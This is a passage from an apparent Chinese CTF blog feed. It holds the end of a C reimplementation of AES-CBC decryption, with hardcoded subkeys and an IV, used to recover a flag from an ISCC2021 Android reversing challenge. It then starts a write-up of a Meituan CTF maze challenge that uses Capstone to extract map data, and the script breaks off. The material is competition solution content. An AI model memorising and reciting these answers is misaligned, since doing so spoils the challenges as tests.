class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> index,j;<br>    <span class="hljs-keyword">int</span> colOne[<span class="hljs-number">4</span>], colTwo[<span class="hljs-number">4</span>], colThree[<span class="hljs-number">4</span>], colFour[<span class="hljs-number">4</span>];<br>    index = i * <span class="hljs-number">4</span>;<br>    splitIntToArray(w[index], colOne);<br>    splitIntToArray(w[index + <span class="hljs-number">1</span>], colTwo);<br>    splitIntToArray(w[index + <span class="hljs-number">2</span>], colThree);<br>    splitIntToArray(w[index + <span class="hljs-number">3</span>], colFour);<br><br>    <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">0</span>] = colOne[j];<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">1</span>] = colTwo[j];<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">2</span>] = colThree[j];<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">3</span>] = colFour[j];<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 参数 c: 密文的字符串数组。</span><br><span class="hljs-comment"> * 参数 clen: 密文的长度。</span><br><span class="hljs-comment"> * 参数 key: 密钥的字符串数组。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deAes</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *c, <span class="hljs-keyword">int</span> clen, <span class="hljs-keyword">char</span> *key)</span> </span>&#123;<br><br>    <span class="hljs-keyword">int</span> cArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> keylen,k;<br>    keylen = <span class="hljs-built_in">strlen</span>(key);<br>    <span class="hljs-keyword">if</span>(clen == <span class="hljs-number">0</span> || clen % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;密文字符长度必须为16的倍数！现在的长度为%d\n&quot;</span>,clen);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!checkKeyLen(keylen)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;密钥字符长度错误！长度必须为16、24和32。当前长度为%d\n&quot;</span>,keylen);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    extendKey(key);<span class="hljs-comment">//扩展密钥</span><br><br>    <span class="hljs-keyword">for</span>(k = <span class="hljs-number">0</span>; k &lt; clen; k += <span class="hljs-number">16</span>) &#123;<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">int</span> wArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br><br>        convertToIntArray(c + k, cArray);<br><br><br><br><br><br>        addRoundKey(cArray, <span class="hljs-number">10</span>);<br><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>            deSubBytes(cArray);<br><br>            deShiftRows(cArray);<br><br>            deMixColumns(cArray);<br>            getArrayFrom4W(i, wArray);<br>            deMixColumns(wArray);<br><br>            addRoundTowArray(cArray, wArray);<br>        &#125;<br><br>        deSubBytes(cArray);<br><br>        deShiftRows(cArray);<br><br>        addRoundKey(cArray, <span class="hljs-number">0</span>);<br><br>        convertArrayToStr(cArray, c + k);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 参数 p: 明文的字符串数组。</span><br><span class="hljs-comment"> * 参数 plen: 明文的长度。</span><br><span class="hljs-comment"> * 参数 key: 密钥的字符串数组。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">aes</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *p, <span class="hljs-keyword">int</span> plen, <span class="hljs-keyword">char</span> *key)</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> keylen = <span class="hljs-built_in">strlen</span>(key);<br>    <span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> k,i;<br><br>    <span class="hljs-keyword">if</span>(plen == <span class="hljs-number">0</span> || plen % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;明文字符长度必须为16的倍数！\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!checkKeyLen(keylen)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;密钥字符长度错误！长度必须为16。当前长度为%d\n&quot;</span>,keylen);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    extendKey(key);<span class="hljs-comment">//扩展密钥</span><br><br>    <span class="hljs-keyword">for</span>(k = <span class="hljs-number">0</span>; k &lt; plen; k += <span class="hljs-number">16</span>) &#123;<br>        convertToIntArray(p + k, pArray);<br><br>        addRoundKey(pArray, <span class="hljs-number">0</span>);<span class="hljs-comment">//一开始的轮密钥加</span><br><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++)&#123;<br><br>            subBytes(pArray);<span class="hljs-comment">//字节代换</span><br><br>            shiftRows(pArray);<span class="hljs-comment">//行移位</span><br><br>            mixColumns(pArray);<span class="hljs-comment">//列混合</span><br><br>            addRoundKey(pArray, i);<br><br>        &#125;<br><br>        subBytes(pArray);<span class="hljs-comment">//字节代换</span><br><br>        shiftRows(pArray);<span class="hljs-comment">//行移位</span><br><br>        addRoundKey(pArray, <span class="hljs-number">10</span>);<br><br>        convertArrayToStr(pArray, p + k);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myAddRoundKey</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> roundKey[<span class="hljs-number">11</span>][<span class="hljs-number">16</span>], <span class="hljs-keyword">int</span> r)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            pArray[i][j] ^= roundKey[r][i * <span class="hljs-number">4</span> + j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> &amp;a, <span class="hljs-keyword">int</span> &amp;b)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> t;<br>    t = a;<br>    a = b;<br>    b = t;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myshift</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> tmpArr[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> rol = <span class="hljs-number">0</span>; rol &lt; <span class="hljs-number">4</span>; rol++ )&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>            tmpArr[(i + rol) % <span class="hljs-number">4</span>][rol] = pArray[i][rol];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            pArray[i][j] = tmpArr[i][j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mydeshift</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> tmpArr[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> rol = <span class="hljs-number">0</span>; rol &lt; <span class="hljs-number">4</span>; rol++ )&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>            tmpArr[(i - rol + <span class="hljs-number">4</span>) % <span class="hljs-number">4</span>][rol] = pArray[i][rol];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            pArray[i][j] = tmpArr[i][j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myTranspose</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> tmpArr[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            tmpArr[i][j] = pArray[j][i];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            pArray[i][j] = tmpArr[i][j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">my_aes_cbc</span><span class="hljs-params">( <span class="hljs-keyword">int</span> *in_,  <span class="hljs-keyword">char</span> * out_,  <span class="hljs-keyword">int</span> * iv_)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> subkeys[<span class="hljs-number">11</span>][<span class="hljs-number">16</span>]  = &#123;<br>            <span class="hljs-number">0x31</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x32</span>,<br>            <span class="hljs-number">0x03</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xF2</span>,<br>            <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x5E</span>,<br>            <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xC4</span>,<br>            <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x10</span>,<br>            <span class="hljs-number">0x07</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x71</span>,<br>            <span class="hljs-number">0x21</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x0F</span>,<br>            <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x6F</span>,<br>            <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x65</span>,<br>            <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x69</span>,<br>            <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x4A</span><br>    &#125;;<br>    <span class="hljs-keyword">int</span> iv[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0xDE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xAA</span>&#125;;<br>    <span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">143</span>, <span class="hljs-number">217</span>, <span class="hljs-number">87</span>, <span class="hljs-number">27</span>, <span class="hljs-number">63</span>, <span class="hljs-number">222</span>, <span class="hljs-number">90</span>, <span class="hljs-number">206</span>, <span class="hljs-number">34</span>, <span class="hljs-number">56</span>, <span class="hljs-number">58</span>, <span class="hljs-number">199</span>, <span class="hljs-number">129</span>, <span class="hljs-number">54</span>, <span class="hljs-number">208</span>, <span class="hljs-number">101</span>&#125;;<br>    <span class="hljs-comment">//convertToIntArray(in_, pArray);</span><br>    <span class="hljs-built_in">memcpy</span>(pArray, (<span class="hljs-keyword">void</span> *)in_, <span class="hljs-number">16</span> * <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">memcpy</span>(iv, (<span class="hljs-keyword">void</span> *)iv_, <span class="hljs-number">16</span> * <span class="hljs-number">4</span>);<br>   <span class="hljs-comment">// convertToIntArray(iv_, iv);</span><br><br>    printArray(pArray);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;start decrypt\n&quot;</span>);<br>    myAddRoundKey(pArray, subkeys, <span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>        mydeshift(pArray);<br>        deSubBytes(pArray);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;round %d end:\n&quot;</span>, i);<br>        printArray(pArray);<br><br>        myAddRoundKey(pArray, subkeys, i);<br><br><br><br>        myTranspose(pArray);<br>        deMixColumns(pArray);<span class="hljs-comment">//列混合</span><br>        myTranspose(pArray);<br><br>    &#125;<br><br>    mydeshift(pArray);<br>    deSubBytes(pArray);<br>    myAddRoundKey(pArray, subkeys, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            pArray[i][j] ^= iv[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result:\n&quot;</span>);<br>    printArray(pArray);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            out_[i * <span class="hljs-number">4</span> + j] = pArray[i][j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> myiv[] = &#123;<span class="hljs-number">0xDE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xAA</span>&#125;;<br>    <span class="hljs-keyword">int</span> data[] = &#123;<span class="hljs-number">143</span>, <span class="hljs-number">217</span>, <span class="hljs-number">87</span>, <span class="hljs-number">27</span>, <span class="hljs-number">63</span>, <span class="hljs-number">222</span>, <span class="hljs-number">90</span>, <span class="hljs-number">206</span>, <span class="hljs-number">34</span>, <span class="hljs-number">56</span>, <span class="hljs-number">58</span>, <span class="hljs-number">199</span>, <span class="hljs-number">129</span>, <span class="hljs-number">54</span>, <span class="hljs-number">208</span>, <span class="hljs-number">101</span>, <span class="hljs-number">219</span>, <span class="hljs-number">87</span>, <span class="hljs-number">151</span>, <span class="hljs-number">84</span>, <span class="hljs-number">99</span>, <span class="hljs-number">59</span>, <span class="hljs-number">205</span>, <span class="hljs-number">133</span>, <span class="hljs-number">66</span>, <span class="hljs-number">20</span>, <span class="hljs-number">128</span>, <span class="hljs-number">13</span>, <span class="hljs-number">168</span>, <span class="hljs-number">241</span>, <span class="hljs-number">214</span>, <span class="hljs-number">244</span>, <span class="hljs-number">77</span>, <span class="hljs-number">159</span>, <span class="hljs-number">13</span>, <span class="hljs-number">141</span>, <span class="hljs-number">32</span>, <span class="hljs-number">4</span>, <span class="hljs-number">143</span>, <span class="hljs-number">255</span>, <span class="hljs-number">105</span>, <span class="hljs-number">178</span>, <span class="hljs-number">73</span>, <span class="hljs-number">189</span>, <span class="hljs-number">131</span>, <span class="hljs-number">170</span>, <span class="hljs-number">104</span>, <span class="hljs-number">33</span>&#125;;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> data_out[<span class="hljs-number">49</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)&#123;<br>        my_aes_cbc(&amp;data[<span class="hljs-number">16</span> * i], (<span class="hljs-keyword">char</span> *)&amp;data_out[<span class="hljs-number">16</span> * i], myiv);<br>        <span class="hljs-built_in">memcpy</span>(myiv, &amp;data[<span class="hljs-number">16</span> * i], <span class="hljs-number">16</span> * <span class="hljs-number">4</span>);<br><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, data_out);<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ISCC2021-mobile&quot;&gt;&lt;a href=&quot;#ISCC2021-mobile&quot; class=&quot;headerlink&quot; title=&quot;ISCC2021 mobile&quot;&gt;&lt;/a&gt;ISCC2021 mobile&lt;/h1&gt;&lt;p&gt;题目下载:  &lt;a href=&quot;/2</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="Reverse" scheme="https://panda0s.top/tags/Reverse/"/>
    
    <category term="Android" scheme="https://panda0s.top/tags/Android/"/>
    
    <category term="AES" scheme="https://panda0s.top/tags/AES/"/>
    
    <category term="AntiDebug" scheme="https://panda0s.top/tags/AntiDebug/"/>
    
  </entry>
  
  <entry>
    <title>美团CTF: 100mazes</title>
    <link href="https://panda0s.top/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-100mazes/"/>
    <id>https://panda0s.top/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-100mazes/</id>
    <published>2021-05-23T14:27:20.000Z</published>
    <updated>2021-05-23T14:51:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="美团CTF-100mazes"><a href="#美团CTF-100mazes" class="headerlink" title="美团CTF: 100mazes"></a>美团CTF: 100mazes</h1><p>题目下载:  <a href="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-100mazes/mazes100" title="mazes100">mazes100</a><br>简单地图题，有100张地图，难点是提取地图数据，我采用 Capstone 引擎反汇编解析<br>每一张地图大小为 25 x 25 地图，地图是加密的，realMap = map1 ^ map2<br>除了提取 map1 和 map2 之外，还需要方向字符串，起点坐标</p><h2 id="map1-amp-方向字符串"><a href="#map1-amp-方向字符串" class="headerlink" title="map1 &amp; 方向字符串"></a>map1 &amp; 方向字符串</h2><p>每一个地图函数开头先赋值 map1 , 逐个字节赋值</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span><span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> - xxx1], xxx2<br></code></pre></td></tr></table></figure><p>一共有 625 条这样的指令。</p><p>紧接着赋值方向指令, 仍然是这个指令格式</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span><span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> - xxx1], xxx2<br></code></pre></td></tr></table></figure><p>因此，连续解析 625 + 4  条 mov    byte ptr 指令</p><h2 id="map2"><a href="#map2" class="headerlink" title="map2"></a>map2</h2><p>map2 怎么解析呢？仔细观察发现 map2 有一条 lea 指令指向，并且是相对 eip 的寻址</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xa4e6c</span>:<span class="hljs-keyword">lea</span><span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0x3ed6d</span>]<br></code></pre></td></tr></table></figure><p>map2 的地址为 0xa4e6c + 0x3ed6d, 直接解析 625 个 int 即可</p><h2 id="起点坐标-x-y"><a href="#起点坐标-x-y" class="headerlink" title="起点坐标 x, y"></a>起点坐标 x, y</h2><p>观察发现，有两条 <code>mov    dword ptr [rbp + xxx], xxx</code> 赋值起点坐标，非常好解析</p><h2 id="解析必要的地图数据完整脚本"><a href="#解析必要的地图数据完整脚本" class="headerlink" title="解析必要的地图数据完整脚本"></a>解析必要的地图数据完整脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">offset</span>):</span><br>    data_bin = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;100mazes&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    data = data_bin[offset: offset + <span class="hljs-number">0x199b</span> + <span class="hljs-number">20</span>]<br>    md = Cs(CS_ARCH_X86, CS_MODE_64)<br>    inscnt = <span class="hljs-number">0</span><br>    inscnt2 = <span class="hljs-number">0</span><br>    map1 = []<br>    map2 = []<br>    map3 = []<br>    <span class="hljs-keyword">for</span> i <span 